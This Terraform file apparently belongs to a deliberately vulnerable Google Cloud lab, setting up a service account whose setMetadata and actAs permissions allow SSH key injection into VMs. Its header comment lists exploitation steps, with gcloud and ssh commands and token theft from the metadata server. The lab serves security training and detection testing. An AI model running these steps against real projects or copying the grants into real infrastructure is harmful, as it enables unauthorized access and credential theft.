# Privesc Path 11: Set Instance Metadata (Manual SSH Key Injection)
#
# VULNERABILITY: A service account with compute.instances.setMetadata can inject
# SSH keys into an existing VM's metadata, gaining SSH access to the instance.
#
# EXPLOITATION:
#   1. Impersonate the attacking service account
#   2. Find instances with high-priv service accounts attached
#   3. Generate SSH key: ssh-keygen -t rsa -f /tmp/evil-key -N ""
#   4. Inject key: gcloud compute instances add-metadata INSTANCE \
#        --metadata="ssh-keys=attacker:$(cat /tmp/evil-key.pub)"
#   5. SSH directly: ssh -i /tmp/evil-key attacker@INSTANCE_IP
#   6. Access the metadata server to get tokens for the attached SA
#
# DETECTION: FoxMapper detects this via the setMetadata edge checker
#
# REAL-WORLD IMPACT: Critical - SSH access to compute instances
#
# DISABLED BY DEFAULT: Requires enable_privesc11 = true (creates target VM ~$2-5/mo)

resource "google_service_account" "privesc11_set_metadata" {
  count = var.enable_privesc11 ? 1 : 0

  account_id   = "${var.resource_prefix}11-set-metadata"
  display_name = "Privesc11 - setMetadata (manual key injection)"
  description  = "Can escalate via manual SSH key injection into instance metadata"
  project      = var.project_id

  depends_on = [time_sleep.batch4_delay]
}

# Custom role with only the vulnerable permission
resource "google_project_iam_custom_role" "privesc11_set_metadata" {
  count = var.enable_privesc11 ? 1 : 0

  role_id     = "${var.resource_prefix}_11_setMetadata"
  title       = "Privesc11 - Set Instance Metadata"
  description = "Vulnerable: Can modify instance metadata to inject SSH keys"
  permissions = [
    "compute.instances.setMetadata",
    "compute.instances.get", # Required to retrieve metadata fingerprint before setMetadata
  ]
  project = var.project_id
}

# Assign the vulnerable role
resource "google_project_iam_member" "privesc11_role" {
  count = var.enable_privesc11 ? 1 : 0

  project = var.project_id
  role    = google_project_iam_custom_role.privesc11_set_metadata[0].id
  member  = "serviceAccount:${google_service_account.privesc11_set_metadata[0].email}"
}

# Allow the attacker to impersonate this service account
resource "google_service_account_iam_member" "privesc11_impersonate" {
  count = var.enable_privesc11 ? 1 : 0

  service_account_id = google_service_account.privesc11_set_metadata[0].name
  role               = "roles/iam.serviceAccountTokenCreator"
  member             = var.attacker_member
}

# Custom role with only actAs (required because setMetadata on a VM with an
# attached SA requires actAs on that SA - GCP treats metadata modification
# as "acting as" the attached service account)
resource "google_project_iam_custom_role" "privesc11_actas" {
  count = var.enable_privesc11 ? 1 : 0

  role_id     = "${var.resource_prefix}_11_actAs"
  title       = "Privesc11 - actAs Only"
  description = "Required for setMetadata on VMs with attached service accounts"
  project     = var.project_id

  permissions = [
    "iam.serviceAccounts.actAs",
  ]
}

resource "google_project_iam_member" "privesc11_actas" {
  count = var.enable_privesc11 ? 1 : 0

  project = var.project_id
  role    = google_project_iam_custom_role.privesc11_actas[0].id
  member  = "serviceAccount:${google_service_account.privesc11_set_metadata[0].email}"
}
